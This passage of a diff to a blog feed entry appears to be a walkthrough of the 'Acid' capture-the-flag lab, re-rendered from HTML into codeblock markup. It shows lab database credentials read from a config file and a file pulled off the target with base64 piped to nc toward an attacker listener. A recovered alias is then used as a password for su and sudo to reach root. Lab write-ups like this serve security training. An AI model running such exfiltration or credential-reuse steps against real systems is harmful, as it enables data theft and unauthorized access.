-</span><span class='line'>/home/acid/.bash_logout</span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+$ cat psl-config.php
+&lt;?php
+define(&ldquo;HOST&rdquo;, &ldquo;localhost&rdquo;);                    // The host you want to connect to.
+define(&ldquo;USER&rdquo;, &ldquo;root&rdquo;);                         // The database username.
+define(&ldquo;PASSWORD&rdquo;, &ldquo;mehak&rdquo;);    // The database password.
+define(&ldquo;DATABASE&rdquo;, &ldquo;secure_login&rdquo;);             // The database name.</p>
+
+<p>www-data@acid:/$ find / -user acid 2>/dev/null
+/sbin/raw_vs_isi/hint.pcapng
+/bin/pwn_me
+/bin/pwn_me/chkrootkit.lsm
+/bin/pwn_me/chkrootkit
+/bin/pwn_me/README.chkwtmp
+/bin/pwn_me/ACKNOWLEDGMENTS
+/bin/pwn_me/chkdirs.c
+/bin/pwn_me/ifpromisc.c
+/bin/pwn_me/Makefile
+/bin/pwn_me/chklastlog.c
+/bin/pwn_me/strings.c
+/bin/pwn_me/chkwtmp.c
+/bin/pwn_me/README.chklastlog
+/bin/pwn_me/COPYRIGHT
+/bin/pwn_me/chkproc.c
+/bin/pwn_me/README
+/bin/pwn_me/chkutmp.c
+/bin/pwn_me/check_wtmpx.c
+/var/lib/lightdm-data/acid
+/var/www/html/Challenge/less
+/var/www/html/Challenge/less/style.less
+/var/www/html/Challenge/css
+/var/www/html/Challenge/css/style.css
+/var/www/html/Challenge/css/style.css.save
+/var/www/html/index.html
+/var/www/html/images
+/var/www/html/images/bg.jpg
+/var/www/html/images/Thumbs.db
+/var/www/html/images/wow.jpg
+/var/www/html/css
+/var/www/html/css/style.css
+/home/acid
+/home/acid/.xsession-errors.old
+/home/acid/Public
+/home/acid/.thumbnails
+/home/acid/Desktop
+/home/acid/.mozilla
+/home/acid/.gconf
+/home/acid/Videos
+/home/acid/Templates
+/home/acid/.config
+/home/acid/Music
+/home/acid/.profile
+/home/acid/.bashrc
+/home/acid/.sudo_as_admin_successful
+/home/acid/Downloads
+/home/acid/.xsession-errors
+/home/acid/.dmrc
+/home/acid/.Xauthority
+/home/acid/.local
+/home/acid/.local/share
+/home/acid/.xscreensaver
+/home/acid/.bash_history
+/home/acid/.bash_logout
+{% endcodeblock %}</p>
 
 <p>The first file was suspicious, after copying to our server and simple analysis we found the following:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nc -l -p 1399 > dump&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>www-data@acid:/$ base64 /sbin/raw_vs_isi/hint.pcapng | nc 192.168.80.137 1399&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>root@kali32:~# base64 -d dump > capfile&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>root@kali32:/var/www# tcpick -C -yU -r capfile | less -R
-</span><span class='line'>&hellip;
-</span><span class='line'>What was the name of the Culprit ???
-</span><span class='line'>saman and now a days he&rsquo;s known by the alias of 1337hax0r
-</span><span class='line'>oh&hellip;Fuck&hellip;.Great&hellip;Now, we gonna Catch Him Soon :D
-</span><span class='line'>&hellip;</span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+root@kali32:~# nc -l -p 1399 > dump</p>
+
+<p>www-data@acid:/$ base64 /sbin/raw_vs_isi/hint.pcapng | nc 192.168.80.137 1399</p>
+
+<p>root@kali32:~# base64 -d dump > capfile</p>
+
+<p>root@kali32:/var/www# tcpick -C -yU -r capfile | less -R
+&hellip;
+What was the name of the Culprit ???
+saman and now a days he&rsquo;s known by the alias of 1337hax0r
+oh&hellip;Fuck&hellip;.Great&hellip;Now, we gonna Catch Him Soon :D
+&hellip;
+{% endcodeblock %}</p>
 
 <p>Finally, we use the string <code>1337hax0r</code> as password:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@acid:/home/acid$ su saman&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>Password: 1337hax0r&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>saman@acid:/home/acid$ sudo su&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>[sudo] password for saman: 1337hax0r&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;hr />
-</span><span class='line'>
-</span><span class='line'>&lt;p> / &lt;strong>&lt;em>|&lt;/em>&lt;/strong>  _ &lt;strong>   &lt;/strong> _ _ &lt;strong> &lt;/strong> &lt;em>| |&lt;/em> _   &lt;em>| | __ &lt;/em>| |&lt;em>(&lt;/em>) &lt;em>&lt;strong>  _ &lt;/strong>  &lt;/em>&lt;strong>
-</span><span class='line'>| |   / _ | &lsquo;&lt;em> \ / &lt;/em>&lt;code>| '__/ _&lt;/code> | &lt;/strong>| | | | |/ &lt;em>` | __| |/ _ | &rsquo;&lt;/em> \/ &lt;strong>|
-</span><span class='line'>| |&lt;/strong>| (&lt;em>) | | | | (&lt;/em>| | | | (&lt;em>| | |&lt;/em>| |&lt;em>| | | (&lt;/em>| | |&lt;em>| | (&lt;/em>) | | | _&lt;em> \
-</span><span class='line'> _&lt;/em>&lt;strong>_&lt;/strong>/|&lt;em>| |&lt;/em>|_&lt;em>, |&lt;/em>|  _&lt;em>,&lt;/em>|_&lt;em>|_&lt;/em>,&lt;em>|&lt;/em>|_&lt;em>,&lt;/em>|_&lt;em>|&lt;/em>|_&lt;strong>/|&lt;em>| |&lt;/em>|&lt;/strong>&lt;em>/
-</span><span class='line'>                  |&lt;/em>__/&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>root@acid:~# cat flag.txt&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>Dear Hax0r,&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>You have successfully completed the challenge.&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>I  hope you like it.&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>FLAG NAME: &ldquo;Acid@Makke@Hax0r&rdquo;&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>Kind &amp; Best Regards&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>-ACID
-</span><span class='line'>facebook: &lt;a href="https://facebook.com/m.avinash143">https://facebook.com/m.avinash143&lt;/a></span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+www-data@acid:/home/acid$ su saman</p>
+
+<p>Password: 1337hax0r</p>
+
+<p>saman@acid:/home/acid$ sudo su</p>
+
+<p>[sudo] password for saman: 1337hax0r</p>
+
+<hr />
+
+<p> / <strong><em>|</em></strong>  _ <strong>   </strong> _ _ <strong> </strong> <em>| |</em> _   <em>| | __ </em>| |<em>(</em>) <em><strong>  _ </strong>  </em><strong>
+| |   / _ | &lsquo;<em> \ / </em><code>| '__/ _</code> | </strong>| | | | |/ <em>` | __| |/ _ | &rsquo;</em> \/ <strong>|
+| |</strong>| (<em>) | | | | (</em>| | | | (<em>| | |</em>| |<em>| | | (</em>| | |<em>| | (</em>) | | | _<em> \
+ _</em><strong>_</strong>/|<em>| |</em>|_<em>, |</em>|  _<em>,</em>|_<em>|_</em>,<em>|</em>|_<em>,</em>|_<em>|</em>|_<strong>/|<em>| |</em>|</strong><em>/
+                  |</em>__/</p>
+
+<p>root@acid:~# cat flag.txt</p>
+
+<p>Dear Hax0r,</p>
+
+<p>You have successfully completed the challenge.</p>
+
+<p>I  hope you like it.</p>
+
+<p>FLAG NAME: &ldquo;Acid@Makke@Hax0r&rdquo;</p>
+
+<p>Kind &amp; Best Regards</p>
+
+<p>-ACID
+facebook: <a href="https://facebook.com/m.avinash143">https://facebook.com/m.avinash143</a>
+{% endcodeblock %}</p>
 ]]></content>
   </entry>
   
